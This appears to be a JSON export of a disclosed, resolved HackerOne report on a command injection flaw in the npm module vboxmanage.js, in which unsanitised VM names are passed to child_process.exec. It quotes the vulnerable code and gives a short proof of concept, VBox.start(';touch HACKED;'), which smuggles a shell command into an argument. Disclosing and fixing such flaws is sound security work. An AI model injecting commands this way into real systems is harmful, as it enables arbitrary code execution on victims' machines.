{
  "id": 864777,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NjQ3Nzc=",
  "url": "https://hackerone.com/reports/864777",
  "title": "[vboxmanage.js] Command Injection via insecure command concatenation",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-05-02T14:21:33.264Z",
  "submitted_at": "2020-05-02T14:21:33.264Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "d3lla",
    "url": "/d3lla",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-08-20T09:08:23.411Z",
  "bug_reporter_agreed_on_going_public_at": "2020-08-20T09:08:23.322Z",
  "team_member_agreed_on_going_public_at": "2020-08-02T16:49:00.598Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report a `Command Injection` issue in the `vboxmanage.js` module.\nIt allows to execute arbitrary commands on the victim's PC.\n\n# Module\n\n**module name:** `vboxmanage.js`\n**version:** `1.0.6`\n**npm page:** `https://www.npmjs.com/package/vboxmanage.js`\n\n## Module Description\n\nA wrapper for VirtualBox CLI with Promises,\n\n## Module Stats\n\n[2] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue occurs because a user input parameter is used inside a command that is executed without any check. \n\nI tested the `start` function.\nHere's the code which causes the issue:\n\n```javascript\n// https://github.com/danielgindi/node-vboxmanage/blob/master/index.js#L76\n...\nvar\n    child_process = require('child_process'),\n...\nVBoxManage.manage = function (command, options) {\n\n    command = command || [];\n    if (!(command instanceof Array)) {\n        command = [command];\n    }\n\n    options = options || {};\n\n    for (var i = 0; i < command.length; i++) {\n        command[i] = escapeArg(command[i]);\n    }\n\n    Object.keys(options).forEach(function (option) {\n\n        command.push('--' + option);\n        var value = options[option];\n\n        if (value !== true) {\n            command.push(escapeArg(value));\n        }\n\n    });\n\n    if (VBoxManage.debug) {\n        console.warn(\"$ VBoxManage \" + command.join(\" \"));\n    }\n\n    return new Promise(function (resolve, reject) {\n\n        child_process.exec(vBoxManageBinary + ' ' + command.join(' '), {}, function (err, stdout, stderr) {  // <-- injection\n\n            if (err) {\n                err.stderr = stderr;\n                return reject(err);\n            }\n\n            return resolve({ stdout: stdout, stderr: stderr });\n\n        });\n\n    });\n};\n...\nVBoxManage.start = function (vmname, gui, options) {\n    options = options || {};\n    options['type'] = gui ? 'gui' : 'headless';\n    return this.manage(['-nologo', 'startvm', vmname], options); // <-- user input\n};\n...\n```\nThe `vmname` parameter is used to build the command that is passed to the `child_process.exec` function without any check.\n\n\n## Steps To Reproduce:\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `vboxmanage.js` module:\n    -  `npm i vboxmanage.js`\n- create the following PoC JavaScript file (`poc.js`):\n\n```javascript\nvar VBox = require('vboxmanage.js');\nVBox.start(';touch HACKED;').then(function () {}).catch(function (err) {});\n```\n- make sure that the `HACKED` file does not exist:\n    - `ls`\n- execute the `poc.js` file:\n    - `node poc.js`\n- the `HACKED` file is created:\n    - `ls`\n    \n{F812305}\n\n\n## Patch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it. \nIn my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.1.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nCommand Injection on `vboxmanage.js` module via insecure command concatenation.",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 812305,
      "file_name": "poc_vboxmanage.mov",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ZkwXwGGboTipaUo4MrbHPpnJ?response-content-disposition=attachment%3B%20filename%3D%22poc_vboxmanage.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_vboxmanage.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTEH7FK2R%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T092217Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICN4dtf0Tdbkaq5cn4i%2FXti7QcDA1cKVfkHNEt1w6htIAiBUkPisuo8fhfz0yAKSS95Q33zYfabab6LGhpfF0fhKqCqxBQgSEAMaDDAxMzYxOTI3NDg0OSIMdLbiI216xY5zVx3cKo4FROJoon80w%2BDZm5e0WvVs4pCgw154wQGpSo%2F9%2BLabMvqd5hWVda%2FYfEk%2FSmEDTF50kF2lvogkzcPOpTOAJywKgSPNgH22KBdHpFzglEdeM6ucEAVz5PG4%2B%2BnsnssWFAZnSK2HdAsF80vAIrVZddmwmGtBJ8Vy6GgsuvrqfmSUiJ7YWc9DObJrduBPKZlUhlRIdHcmJbDfNZw%2F5x5Dj3nk7GiMRhU3Rdj2E06xzz57WekiqPqHX8SgFAbP1llh2pEdazmNHja6e%2F8CaQ9ZvjjXwxPGue4PBiuhk7gD0nvzaip%2BVU%2Bg0%2F4cCd%2BRuUuh%2BthIRX8odPXsuR1%2Bdo6WG3vFaWIfuovwOTvateT1FOPKL3IlqBVNGusQmZxoxqyRZNA%2BGDGkvIWrl14Ea%2Bol7kykC9yRDZV7wsN9Sy2O6ub0X1iUtP2nwai0R6gD4lXoDwpcPjMQBPInE2CG%2BKNqfW8RLSH7Qt6Op9IcRtUNsTJfA2UiI8Llap%2B4qfvD90bPmZpfDjp4f9PBFMp%2FJZEPno2an6PE4TQvhXbe4qGT8I4hQ4RUv%2BW98vHHV4Ct%2BmBTKimhupQaWg7KDndaBqKWP1R7mbj7YGOmT5AL%2FV0giwMlCDzQceTZKyyn3Rc7tiD7Vb5oyNLlGs56f6nPAyASTS7FZ%2F59ZcGZURXVLUwLmwqZ3pr1EUtg%2FgxPpvjFwlg7PYJFhgjs7x7mS1hynRgNtc8VZVAEcUu7UTm5iTOjjLHfKPU3ge6LWYFn5rtyjyMtxz5pw%2FmNaI1GJwp%2F5ChOyeb%2Fx2We77B3pozJdgP%2BC30cXd2nDaQkRhCy0oiHKvgz3QC%2FPW5CW8O71kpnNHvexQj6GztvB98%2BKapW3N6y%2FkAcMI%2FzvsYGOrIBEmTge1rlGKJIsBdOtKsimeEb%2BvaRhFqFZP7R0c%2FD5V5fSThFO94JuZaMNmDHxmBnUyC3Kg3XDXE%2BxaY9Nq11Vvdhlkwbx%2FWZWTi8mJ0O1rU4zjdbbMpDGwBL15YlAX08vKzpPR14k8stMuLxICysDUkd0RFrkNzEhvy6UV19TFKRlTCUFPbp%2BLNaIoC%2BbuvSgiII%2FhDB369MhAZhYd7PcjtGGOMMC2BrMZgbuZebVGPkvA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=240b305a706d1a8b0cbb40a92344acee03e93c84bb08695f45c847671303a091",
      "file_size": 829151,
      "type": "video/quicktime",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-09-01T16:49:00.676Z",
  "allow_singular_disclosure_after": -159467596.3783374,
  "singular_disclosure_allowed": true,
  "vote_count": 0,
  "voters": [],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
